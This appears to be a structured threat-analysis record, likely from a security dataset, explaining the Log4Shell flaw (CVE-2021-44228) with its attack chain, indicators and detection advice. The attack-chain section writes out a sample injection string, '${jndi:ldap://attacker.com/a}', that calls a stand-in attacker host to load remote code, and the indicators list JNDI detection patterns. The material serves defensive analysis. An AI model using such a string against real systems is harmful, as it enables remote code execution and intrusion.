package_info.why_malicious: The Log4j package contained a critical remote code execution (RCE) vulnerability (CVE-2021-44228, 'Log4Shell') that allowed attackers to execute arbitrary code on affected systems by injecting specially crafted JNDI lookup strings into log messages. This flaw enabled attackers to gain initial access, deploy malware, establish remote shells, escalate privileges, and perform further exploitation, making the package a high-severity risk in any unpatched deployment.

execution_context.trigger: At runtime, when a log message containing a JNDI lookup pattern is processed by Log4j.
required_permissions: JNDI access (Java Naming and Directory Interface)
Ability to load and execute remote Java classes

malicious_snippets.code_behavior: At runtime, when a log message containing a JNDI lookup pattern is processed, Log4j interprets the pattern, initiates a remote JNDI lookup via LDAP to attacker.com, retrieves and deserializes attacker-controlled Java class data, and executes the code on the server, resulting in remote code execution.

malice_analysis.why_suspicious: This behavior allows untrusted user input in log messages to trigger network-based JNDI lookups, enabling attackers to deliver and execute arbitrary code remotely without authentication.
malice_analysis.violated_expectations: Normal logging libraries should treat log message content as inert data and must not interpret or execute embedded expressions, nor initiate network requests based on log data.
malice_analysis.similar_legitimate_use: JNDI lookups are legitimate for internal service discovery or configuration in trusted, controlled environments, but should never be exposed to untrusted or user-supplied input in log messages.
key_indicators: Presence of ${jndi:...} patterns in log messages
Outbound LDAP, RMI, or DNS requests initiated during log processing
Loading and deserialization of remote Java classes via JNDI
Use of JndiLookup.class in the application classpath

attack_chain.action: Attacker sends a specially crafted log message containing a JNDI lookup string (e.g., ${jndi:ldap://attacker.com/a}) to a vulnerable application.
attack_chain.leads_to: Log4j processes the log message and interprets the JNDI lookup pattern.

attack_chain.action: Log4j initiates an outbound network request to the attacker-controlled LDAP server specified in the JNDI string.
attack_chain.leads_to: The attacker-controlled server responds with a reference to a malicious Java class.

attack_chain.action: Log4j retrieves, deserializes, and executes the attacker-supplied Java class, resulting in arbitrary code execution on the server.
attack_chain.leads_to: Attacker gains remote code execution, enabling deployment of malware, establishment of persistence, privilege escalation, or data exfiltration.

behavioral_signatures: Log messages containing ${jndi:ldap://...}, ${jndi:rmi://...}, or similar JNDI patterns
Unexpected outbound LDAP, RMI, or DNS requests from application servers during log processing
Deserialization and loading of remote Java classes triggered by log events
file_indicators: Presence of vulnerable Log4j versions (2.0-beta9 through 2.14.1) in application dependencies
JndiLookup.class present in the application classpath or packaged JAR files
network_indicators: Outbound LDAP, RMI, or DNS requests to external or untrusted IP addresses or domains immediately following log events
Connections to attacker-controlled infrastructure (e.g., attacker.com) initiated by the application server
detection_knowledge.how_to_detect: Monitor application logs for suspicious JNDI lookup patterns such as ${jndi:ldap://}, scan deployed applications for vulnerable Log4j versions and the presence of JndiLookup.class, and alert on unexpected outbound LDAP, RMI, or DNS traffic from servers. Use software bill of materials (SBOM) tools to identify Log4j dependencies, prioritize patching or mitigation, and employ runtime application security monitoring to detect exploitation attempts in real time.
